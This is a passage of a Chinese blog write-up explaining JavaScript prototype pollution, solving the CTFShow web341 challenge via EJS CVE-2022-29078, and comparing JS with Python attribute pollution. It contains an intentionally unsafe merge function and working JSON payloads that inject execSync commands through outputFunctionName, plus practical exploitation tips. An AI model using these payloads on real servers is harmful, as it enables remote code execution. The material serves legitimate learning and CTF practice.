+</blockquote>
+<p>最后，虽然 bar 是全新 <code>new Foo()</code> 出来的实例，没有自己定义 msg，但是访问 <code>bar.msg</code> 拿到了污染后的值，说明 Foo 的原型对象被污染。</p>
+<blockquote>
+<p>修改 <code>foo.__proto__.msg</code>，而 foo 是 Foo 的实例，所以实际上修改了 Foo 的原型对象，给这个原型对象覆盖了属性 msg。 之后只要再用 Foo 创建实例，实例在自身找不到 msg 时，就会读到被污染的值。</p>
+</blockquote>
+<p>那么，如果在应用里，攻击者可控输入，可以往 <code>__proto__</code> 写入属性，就可以污染这个构造函数对应的原型对象，影响所有该构造函数的实例，这就是 NodeJS 原型链污染最典型的一类场景。</p>
+<hr>
+<h1 id="污染条件"><a href="#污染条件" class="headerlink" title="污染条件"></a>污染条件</h1><p>根据上述分析，原型链能被攻击者修改，其实就是我们可以设置<code>__proto__</code>的值，其实也就是找能够控制数组（对象）的“键名”的操作即可，离别歌给出了以下两点</p>
+<ul>
+<li>对象<code>merge</code></li>
+<li>对象<code>clone</code>（其实内核就是将待操作的对象<code>merge</code>到一个空对象中）</li>
+</ul>
+<p>其实包括上篇文章我们也可以知道，<code>merge</code>（深度合并）这个函数的作用就是把两个对象的内容融合在一起，<strong>把源对象的属性拷贝到目标对象，嵌套对象也跟着递归合并，而不是直接覆盖</strong>。</p>
+<p>如果该函数配置处理不当就会造成安全问题，该函数也是 CTF 或者实际应用常见的特征点。</p>
+<p>这里我们以对象<code>merge</code>为例：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不安全递归合并函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="comment">// 如果当前 value 是对象且不为 null，就递归往下合并</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> source[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; source[key] !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!target[key]) target[key] = &#123;&#125;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 普通值，直接赋值</span></span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可控输入：攻击者传入的 payload</span></span><br><span class="line"><span class="keyword">const</span> payload = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> user = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">merge</span>(user, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新建一个完全独立的空对象</span></span><br><span class="line"><span class="keyword">let</span> visitor = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(visitor.<span class="property">isAdmin</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="逐行解读"><a href="#逐行解读" class="headerlink" title="逐行解读"></a>逐行解读</h2><h3 id="merge-函数"><a href="#merge-函数" class="headerlink" title="merge 函数"></a><code>merge</code> 函数</h3><p>它的作用是把 <code>source</code> 的内容深度合并进 <code>target</code>。遍历 <code>source</code> 的每一个键：</p>
+<ul>
+<li>如果这个键对应的值是对象，就在目标上新建一个空对象，继续递归合并；</li>
+<li>如果是普通值，直接执行 <code>target[key] = source[key]</code>。</li>
+<li><strong>致命点：没有任何针对 <code>__proto__</code>、<code>constructor</code> 的过滤。</strong></li>
+</ul>
+<h3 id="payload-解析"><a href="#payload-解析" class="headerlink" title="payload 解析"></a>payload 解析</h3><p><code>JSON.parse</code> 解析出来的对象，里面有一个键名字就是字符串 <code>__proto__</code>。<br>这里很关键：在 JS 里，当你做 <code>obj[&quot;__proto__&quot;] = xxx</code>，不是往 obj 上增加一个叫 <code>__proto__</code> 的普通属性，而是<strong>修改这个对象的隐式原型</strong>。</p>
+<h3 id="调用-merge-user-payload"><a href="#调用-merge-user-payload" class="headerlink" title="调用 merge (user, payload)"></a>调用 merge (user, payload)</h3><p>循环拿到 <code>key = &quot;__proto__&quot;</code>，进入分支，执行 <code>merge(target[&quot;__proto__&quot;], &#123; isAdmin: true &#125;)</code>。<br>这里的 <code>target[&quot;__proto__&quot;]</code> 就是 <code>Object.prototype</code>，于是等价于：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">isAdmin</span> = <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="let-visitor-，打印-visitor-isAdmin"><a href="#let-visitor-，打印-visitor-isAdmin" class="headerlink" title="let visitor = {}，打印 visitor.isAdmin"></a><code>let visitor = &#123;&#125;</code>，打印 <code>visitor.isAdmin</code></h3><p><code>visitor</code> 是全新创建的普通对象，它自己身上根本没有 <code>isAdmin</code>。按照 JS 属性查找规则，找不到就沿着原型链往上，一直查到<code>Object.prototype</code>，读到我们刚刚塞进去的 <code>true</code>。</p>
+<h2 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a>核心原理</h2><p><code>JavaScript</code>对象访问属性的时候：</p>
+<ul>
+<li>先查对象自身的属性；</li>
+<li>如果找不到，就去它的原型对象；</li>
+<li>一路向上，直到原型为 <code>null</code>；</li>
+<li><code>Object.prototype</code>是绝大多数普通对象的顶层原型。一旦我们往它上面写入属性，所有普通对象都会共享这个属性。</li>
+</ul>
+<p>这就是原型链污染：不是篡改某个单独对象，而是篡改原型对象，批量影响一大批对象。</p>
+<blockquote>
+<p>补充小坑： 如果对象自己本身就有 <code>isAdmin</code>，会优先读自身，原型上的值不会生效； 如果是 <code>Object.create(null)</code> 创建出来的对象，没有原型，不受影响。</p>
+</blockquote>
+<h3 id="成功所需条件"><a href="#成功所需条件" class="headerlink" title="成功所需条件"></a>成功所需条件</h3><ul>
+<li><strong>输入的 key 可控</strong>：攻击者可以自己指定键名，能够送入 <code>__proto__</code>、<code>constructor</code>、<code>constructor.prototype</code>；只能控制值、key 固定的话，没法打。</li>
+<li><strong>存在无过滤的动态写入（sink）</strong>：递归合并、深拷贝、动态路径赋值，遇到特殊键不会跳过。经典的除了手写 merge，旧版 lodash 的 <code>_.merge</code>、<code>_.set</code> 都是。</li>
+<li><strong>解析不会吃掉特殊键</strong>：<code>JSON.parse</code> 可以保留 <code>__proto__</code>；如果后端提前过滤、删除这个键，攻击链断掉。</li>
+<li><strong>存在读取点（gadget）</strong>：光污染原型没用，后端代码必须有地方读取这个属性。比如权限判断 <code>if(user.isAdmin)</code>，只有代码读到它，才能实现越权、RCE 这类效果。</li>
+</ul>
+<blockquote>
+<p>不成立情况:</p>
+<ul>
+<li>合并函数检测到 <code>__proto__</code>，直接跳过；</li>
+<li>使用 <code>Object.create(null)</code> 作为合并目标；</li>
+<li>只是浅层合并，不递归；</li>
+<li>目标原型上该属性被设置为不可写。</li>
+</ul>
+</blockquote>
+<p><code>merge</code>操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p>
+<hr>
+<h1 id="CVE‑2022‑29078"><a href="#CVE‑2022‑29078" class="headerlink" title="CVE‑2022‑29078"></a>CVE‑2022‑29078</h1><p>第一次遇见来自 CTFShow-Web341，不过这道 CTF 是原型链污染 + EJS 组合打出 RCE 的链子，而 CVE 指的是后者的EJS，以原型链污染为入口，标题写 CVE 要高级些，这里就用题目源码分析。</p>
+<p>所以这里提一下非常关键的区分：</p>
+<ul>
+<li><code>CVE-2022-29078</code> 的本体是 EJS 引擎侧的 SSTI&#x2F;RCE：<code>renderFile</code> 会把 <code>options</code> 里的 <code>outputFunctionName</code>、<code>escapeFunction</code> 等直接拼进编译源码，影响 ejs &lt;&#x3D; 3.1.6，3.1.7 修复（增加合法标识符校验、不再从原型链取这些选项）。本项目的 <code>package-lock.json</code> 恰好锁死 3.1.5，属于受影响版本。</li>
+<li>本题的入口不是 CVE 本身，而是 <code>utils.copy</code> 的原型链污染（应用自身的代码缺陷）。整条链是：原型链污染（入口，非 CVE）→ 污染 <code>Object.prototype.outputFunctionName</code> → 命中 <code>CVE-2022-29078</code> 的 sink → RCE。</li>
+</ul>
+<p>所以严格表述是：<strong>web341 &#x3D; 原型链污染 + CVE-2022-29078</strong> 组合利用，而不是”仅靠 CVE-2022-29078 就能打”。差异也体现在修复上：只升级 EJS 到 3.1.7+ 能堵住 sink（本题即失效），但 copy 的原型链污染本身仍需单独修。</p>
+<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>对于本题，重要的还是需要弄清楚代码是怎么操作运行的，因为没有用这个语言开发过所以还是比较生疏。</p>
+<img src="/img/JSPP01.png">
+
+
+
+<h2 id="源码关键点"><a href="#源码关键点" class="headerlink" title="源码关键点"></a>源码关键点</h2><p>1、污染点 <code>utils/common.js:7-15</code>：<code>for...in</code> + 直接赋值，没有过滤 <code>__proto__</code>，也没有 <code>hasOwnProperty</code> 判断。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">copy</span>:copy</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>2、入口 <code>routes/login.js:17</code>：<code>utils.copy(user.userinfo, req.body)</code>，<code>req.body</code> 完全来自用户 JSON。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>&#125;);  </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>3、落地 <code>node_modules/ejs@3.1.5/lib/ejs.js:587-588</code>（版本由 <code>package-lock.json</code> 锁死为 3.1.5，无任何 <code>_JS_IDENTIFIER</code> 校验）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">  prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>而 <code>renderFile</code> 里的 <code>opts</code> 是字面量 <code>&#123;filename: filename&#125;</code>，自身没有 <code>outputFunctionName</code>，于是沿着 <code>Object.prototype</code> 读到了被污染的值 → 字符串拼接进源码 → <code>new Function</code> 执行。</p>
+</blockquote>
+<h2 id="构造Payload测试"><a href="#构造Payload测试" class="headerlink" title="构造Payload测试"></a>构造Payload测试</h2><p>有了基本的分析，<code>CTFShow</code>平台给了容器环境，省去了我们运行，现在构造<code>Payload</code>，最终目标是运行<code>&#39;cat /flag&#39;</code>命令，污染值里直接调用 <code>__append()</code>，把 <code>cat /flag</code> 的结果塞进页面输出，这样<strong>不需要写文件、不需要外带、不需要反弹：</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;outputFunctionName&quot;</span>:</span><br><span class="line">    <span class="string">&quot;x;__append(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString());var __tmp&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h2><p>靶场是一个登录页面，抓包后修改请求体，可以看看我下面哪里有问题：</p>
+<img src="/img/JSPP02.png">
+
+<blockquote>
+<p>没错光标处第 3 个字段少写了键名，直接塞了个裸对象 <code>&#123;...&#125;</code>，JSON 不允许这种语法 —— 报错 <code>Unexpected token &#123; in JSON at position 31 的 31</code> 正好指向这个 <code>&#123;</code>。<code>body-parser</code> 在解析阶段就挂了，<code>utils.copy</code> 根本没执行，所以什么都没污染。</p>
+</blockquote>
+<p>在请求体里面，<code>__proto__</code> 必须作为字符串键放在同一个对象里：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>:<span class="string">&quot;2&quot;</span>,</span><br><span class="line">  <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;outputFunctionName&quot;</span>:</span><br><span class="line">  <span class="string">&quot;x;__append(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString());var __tmp&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>MD怎么还是污染不成功！让<code>Kali-claude</code>给我审计了一下，发现<code>copy()</code> 的第一层 <code>__proto__</code> 拿到的是 <code>userinfo</code> 的中间原型（<code>new function()&#123;&#125; 的 prototype</code>），不是<code>Object.prototype</code>，EJS 根本读不到。</p>
+<h2 id="最终Payload"><a href="#最终Payload" class="headerlink" title="最终Payload"></a>最终Payload</h2><p>所以，单层 <code>__proto__</code> 不行（只污染到 <code>userinfo</code> 的中间原型）；双层 <code>__proto__</code> 才能到达<code>Object.prototype</code>，且已验证能执行命令。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>:<span class="string">&quot;2&quot;</span>,</span><br><span class="line">  <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;outputFunctionName&quot;</span>:</span><br><span class="line">    <span class="string">&quot;x;__append(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString());var __tmp&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>粘贴这个进BP，写成一行好粘：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;x;__append(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString());var __tmp&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就没问题了，构造<code>POST /login  → &#123;&quot;ret_code&quot;:2,&quot;ret_msg&quot;:&quot;登录失败&quot;&#125;</code>，返回这个，说明污染已生效后，再重新 GET 进去是这样的：</p>
+<img src="/img/JSPP03.png">
+
+
+
+<p>这里再另外给出一个可行的<code>Payload</code>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line"><span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;outputFunctionName&quot;</span>:</span><br><span class="line">  <span class="string">&quot;a; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;);//&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>与主 payload 的区别：用 <code>return</code> 直接返回 Buffer，<code>//</code> 注释掉末尾 <code>= __append;</code>；<code>Express</code> 把 <code>Buffer</code> 原样发出，<strong>响应体就是命令输出本身</strong>（不带 HTML）。<code>process.mainModule</code> 是 <code>bin/www</code>，<code>.constructor </code>即  <code>Module</code>，<code>Module._load(&#39;child_process&#39;)</code> 取模块成功。                                         </p>
+</blockquote>
+<h2 id="操作陷阱"><a href="#操作陷阱" class="headerlink" title="操作陷阱"></a>操作陷阱</h2><p>1、一个容器只有一次污染机会：<code>Object.prototype.outputFunctionName</code> 变成字符串后，再 POST 会走 <code>copy(&quot;旧值&quot;,&quot;新值&quot;) → &#39;0&#39; in &quot;旧值&quot;</code> 抛 <code>TypeError → 500</code>，且旧 <code>payload</code> 无法覆盖。要换 <code>payload</code> 必须重启容器&#x2F;环境。</p>
+<p>2、别用浏览器 JS 对象字面量构造 <code>payload</code>：<code>&#123;__proto__:&#123;...&#125;&#125;</code> 在 JS 里是“设置原型”的语法，<code>JSON.stringify</code> 后变成 {}，污染不到。必须发原始 JSON 字符串（<code>Burp/hackbar/curl</code> 直接写 <code>body</code>）。</p>
+<p>3、每次 GET &#x2F; 都会重新编译并执行一次命令（视图无缓存），所以同一条 <code>payload</code> 完了可以重复读 flag，不用重新污染。</p>
+<p>4、污染过程中，返回”登录失败”是正常的（<code>isAdmin</code> 是自身 <code>false</code> 遮蔽原型），不代表污染失败。</p>
+<h2 id="爱死Claude了"><a href="#爱死Claude了" class="headerlink" title="爱死Claude了"></a>爱死Claude了</h2><hr>
+<h1 id="Py和JS污染区别"><a href="#Py和JS污染区别" class="headerlink" title="Py和JS污染区别"></a>Py和JS污染区别</h1><p>因为学长面试被问到这道题了，所以我自己也来总结一下：</p>
+<h2 id="JS-vs-Python"><a href="#JS-vs-Python" class="headerlink" title="JS vs Python"></a>JS vs Python</h2><p>JS 是真正的<strong>原型</strong>继承污染（<code>Prototype Pollution</code>），修改共享原型对象，全局继承生效；Python 没有原型机制，CTF 里叫它 “原型链污染” 只是习惯叫法，本质是【类属性污染 &#x2F; 属性路径覆盖】，依靠 MRO 继承链或者属性路径修改共享对象，必须有特殊 sink 才能触发。</p>
+<p>这其实就是我上篇文章的总结。</p>
+<h2 id="对象模型对比"><a href="#对象模型对比" class="headerlink" title="对象模型对比"></a>对象模型对比</h2><table>
+<thead>
+<tr>
+<th>对比项</th>
+<th>JavaScript</th>
+<th>Python</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>属性查找链路</td>
+<td>实例 → <code>[[Prototype]]</code>（<code>__proto__</code>）→ … → <code>Object.prototype</code></td>
+<td>实例<code>__dict__</code> → <code>type(obj)</code>（所属类）→ MRO（类→基类）</td>
+</tr>
+<tr>
+<td>共享载体</td>
+<td><strong>原型对象</strong>，所有同类对象默认共享</td>
+<td>类属性，该类、子类的全部实例共享</td>
+</tr>
+<tr>
+<td>根节点</td>
+<td><code>Object.prototype</code>，默认可写</td>
+<td>顶层<code>object</code>不可修改，赋值直接抛<code>TypeError</code></td>
+</tr>
+<tr>
+<td>内置类型</td>
+<td><code>Array.prototype</code>等内置原型可被污染</td>
+<td><code>int/str/list</code>等内置类型不可修改，只能污染用户自定义类、框架普通类</td>
+</tr>
+<tr>
+<td><code>__proto__</code>含义</td>
+<td><code>Object.prototype</code>上的访问器，具备特殊原型语义</td>
+<td>无特殊魔法含义，仅仅是普通字符串 key</td>
+</tr>
+<tr>
+<td>dict &#x2F; 对象命名空间</td>
+<td><code>obj.x</code> 和 <code>obj[&quot;x&quot;]</code> 是同一套空间</td>
+<td>字典 key 和对象属性是两套独立空间：<code>&#123;&quot;__proto__&quot;:&#123;&#125;&#125;</code>只是普通 dict 键，<code>getattr</code>拿不到</td>
+</tr>
+</tbody></table>
+<h2 id="污染入口（Sink）差异"><a href="#污染入口（Sink）差异" class="headerlink" title="污染入口（Sink）差异"></a>污染入口（Sink）差异</h2><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><ol>
+<li>天然污染源多：<code>JSON.parse</code>解析后<code>__proto__</code>会成为自有属性，<code>for...in</code>、<code>key in obj</code>可以识别到这个 key，递归合并很容易触发污染</li>
+<li>常见危险代码：不安全<code>merge/extend/copy</code>递归函数；经典库：lodash、dot-prop</li>
+<li>payload 核心 key：<code>__proto__</code>、<code>constructor.prototype</code></li>
+</ol>
+<blockquote>
+<p>例（web341 EJS 那道，两层 proto）：<code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;payload&quot;&#125;&#125;&#125;</code></p>
+</blockquote>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><ol>
+<li>原生<code>json.loads</code>输出普通 dict，<code>&#123;&quot;__proto__&quot;:xxx&#125;</code>本身无害，<strong>不会自动污染</strong></li>
+<li>必须代码显式把 key 当成对象属性写入，才会形成污染：<ul>
+<li><code>setattr(obj,key,val)</code></li>
+<li>递归 merge：搭配<code>getattr</code>逐层取属性、递归赋值</li>
+<li><code>**kwargs</code>批量赋值、配置加载器、ORM 批量赋值</li>
+</ul>
+</li>
+<li>常用属性链：<code>__class__</code>、<code>__base__</code>、<code>__bases__</code>，进阶还可以走<code>__globals__</code>去修改全局 &#x2F; 单例（比如 Flask 的 app.config）</li>
+</ol>
+<blockquote>
+<p>注意：<code>__globals__</code>这条属于属性路径劫持，不属于继承链污染</p>
+</blockquote>
+<h2 id="影响面、利用方式对比"><a href="#影响面、利用方式对比" class="headerlink" title="影响面、利用方式对比"></a>影响面、利用方式对比</h2><table>
+<thead>
+<tr>
+<th>对比项</th>
+<th>JavaScript</th>
+<th>Python</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>影响范围</td>
+<td>进程级全局污染，几乎所有读取配置、<code>options</code> 的库都可以作为 <code>gadget</code></td>
+<td>只影响目标类、子类或者目标共享单例；范围由 MRO 或者目标对象决定</td>
+</tr>
+<tr>
+<td>经典利用链</td>
+<td><code>EJS</code> <code>outputFunctionName</code> <code>RCE</code>、<code>child_process</code> 环境注入、模板引擎 gadget</td>
+<td>修改<code>isvip</code>权限绕过；篡改<code>app.config.SECRET_KEY</code>伪造 <code>session</code>；配合 SSTI 的<code>__globals__</code>链（不属于原型污染）</td>
+</tr>
+<tr>
+<td>通用性</td>
+<td>通用原语，一次污染，大量第三方库可利用</td>
+<td>强依赖题目里的 sink 代码，没有通用根原型可以污染</td>
+</tr>
+<tr>
+<td>生效周期</td>
+<td>进程生命周期内全局生效，需要<code>delete</code>清除；部分场景无法二次覆盖</td>
+<td>类属性同样进程级生效；多 <code>worker</code> 模式下，仅当前 <code>fork</code> 进程受影响</td>
+</tr>
+<tr>
+<td>标准名称</td>
+<td><code>Prototype Pollution</code>，大量独立 CVE（<code>lodash</code>、<code>ejs</code> 等）</td>
+<td>标准叫法：类属性污染 &#x2F; 属性注入，很少单独分配 CVE</td>
+</tr>
+</tbody></table>
+<h2 id="审计识别要点"><a href="#审计识别要点" class="headerlink" title="审计识别要点"></a>审计识别要点</h2><ul>
+<li>JS：检索<code>merge/extend/copy</code>、<code>for...in</code>递归、<code>key in obj</code>；注意判断原型层数，层数不对 <code>payload</code> 打不中目标 <code>gadget</code></li>
+<li>Python：检索<code>setattr(</code>、<code>getattr(</code>递归、手写 merge、<code>**kwargs</code>；重点判断目标是不是共享对象：类、<code>app.config</code>、全局注册器；单纯 <code>dict update</code> 不会触发污染</li>
+</ul>
+<h2 id="共通点-总结"><a href="#共通点-总结" class="headerlink" title="共通点 &amp; 总结"></a>共通点 &amp; 总结</h2><h3 id="共同点："><a href="#共同点：" class="headerlink" title="共同点："></a>共同点：</h3><p>污染本质都是<strong>写入共享状态</strong>；单纯污染本身没有危害，必须找到下游 gadget 读取被篡改的属性，才能实现权限绕过、RCE 等效果；同一次污染对同一个进程内所有请求生效。</p>
+<h3 id="核心区分记忆"><a href="#核心区分记忆" class="headerlink" title="核心区分记忆"></a>核心区分记忆</h3><p>JS：<strong>篡改原型继承规则，所有对象自动继承被修改的属性</strong><br>Python：<strong>没有原型，只是顺着类继承链 &#x2F; 属性路径，修改类、全局单例上的属性</strong></p>
+<blockquote>
+<p>做题避坑：不要直接把 JS 的<code>__proto__</code>payload 思路套 Python；Python 优先<code>__class__</code>+<code>__base__</code>，且必须存在 setattr 类 sink。</p>
+</blockquote>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>👍👍👍时间沉淀的老文章就是夯：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">深入理解 JavaScript Prototype 污染攻击 | 离别歌</a></p>
+<p><a target="_blank" rel="noopener" href="https://wanth3f1ag.top/posts/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">js原型链污染 | root@wanth3f1ag</a></p>
